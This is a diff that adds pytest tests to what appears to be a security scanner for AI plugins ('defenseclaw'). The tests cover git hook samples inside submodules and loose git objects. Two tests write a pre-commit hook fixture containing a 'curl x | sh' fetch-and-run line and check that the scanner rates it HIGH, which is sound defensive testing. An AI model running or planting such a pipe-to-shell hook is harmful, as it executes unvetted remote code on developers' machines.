@@ -234,6 +234,69 @@ def test_gap2039_an_interpreter_script_build_file_or_archive_keeps_the_judge_hig
     assert ("LLM-OB-009-001", "HIGH") in {(f.rule_id, f.severity) for f in result.findings}, name
 
 
+def _git(*args: str) -> None:
+    env = {**os.environ, "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull,
+           "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.invalid",
+           "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.invalid"}
+    subprocess.run(["git", "-c", "protocol.file.allow=always", *args], check=True, env=env,
+                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+
+
+@pytest.mark.skipif(shutil.which("git") is None, reason="needs git")
+def test_gap2100_a_skill_only_plugin_with_a_submodule_keeps_the_cap(tmp_path, monkeypatch) -> None:
+    # git submodule add writes the submodule's git dir, with its own 0755
+    # hook samples, under .git/modules/<name>/hooks. None of them runs.
+    sub = tmp_path / "notes"
+    sub.mkdir()
+    (sub / "README.md").write_text("notes\n")
+    _git("init", "-q", str(sub))
+    _git("-C", str(sub), "add", "-A")
+    _git("-C", str(sub), "commit", "-qm", "init")
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    _git("init", "-q", str(plugin))
+    _git("-C", str(plugin), "submodule", "add", "-q", str(sub), "notes")
+    hooks = plugin / ".git" / "modules" / "notes" / "hooks"
+    assert any(p.name.endswith(".sample") for p in hooks.iterdir())
+    result = _scan(plugin, monkeypatch)
+    found = {(f.rule_id, f.severity) for f in result.findings}
+    assert found >= {("LLM-OB-009-001", "MEDIUM"), ("META-LLM-001", "MEDIUM")}, found
+
+
+def test_gap2100_a_submodule_hook_that_is_not_a_sample_keeps_the_judge_high(tmp_path, monkeypatch) -> None:
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    hook = plugin / ".git" / "modules" / "notes" / "hooks" / "pre-commit"
+    hook.parent.mkdir(parents=True)
+    hook.write_bytes(b"#!/bin/sh\ncurl x | sh\n")
+    result = _scan(plugin, monkeypatch)
+    assert ("LLM-OB-009-001", "HIGH") in {(f.rule_id, f.severity) for f in result.findings}
+
+
+def test_gap2100_a_sample_outside_a_git_dir_hooks_folder_keeps_the_judge_high(tmp_path, monkeypatch) -> None:
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    hook = plugin / ".git" / "modules" / "hooks" / "run.sample"
+    hook.parent.mkdir(parents=True)
+    hook.write_bytes(b"#!/bin/sh\ncurl x | sh\n")
+    result = _scan(plugin, monkeypatch)
+    assert ("LLM-OB-009-001", "HIGH") in {(f.rule_id, f.severity) for f in result.findings}
+
+
+def test_gap2100_loose_git_objects_do_not_use_up_the_walk_limit(tmp_path, monkeypatch) -> None:
+    from defenseclaw.scanner.plugin_scanner import scanner as plugin_scanner_module
+
+    monkeypatch.setattr(plugin_scanner_module, "_EXECUTABLE_WALK_LIMIT", 20)
+    plugin = _plugin(tmp_path, dict(_SKILL))
+    objects = plugin / ".git" / "objects" / "ab"
+    objects.mkdir(parents=True)
+    for n in range(40):
+        obj = objects / f"{n:038x}"
+        obj.write_bytes(b"x\x01" + bytes([n]) * 8)
+        if os.name != "nt":
+            obj.chmod(0o444)
+    result = _scan(plugin, monkeypatch)
+    found = {(f.rule_id, f.severity) for f in result.findings}
+    assert found >= {("LLM-OB-009-001", "MEDIUM"), ("META-LLM-001", "MEDIUM")}, found
+
+
 def test_operator_severity_override_still_wins(tmp_path, monkeypatch) -> None:
     from defenseclaw.scanner.plugin_scanner import scanner as plugin_scanner_module
 
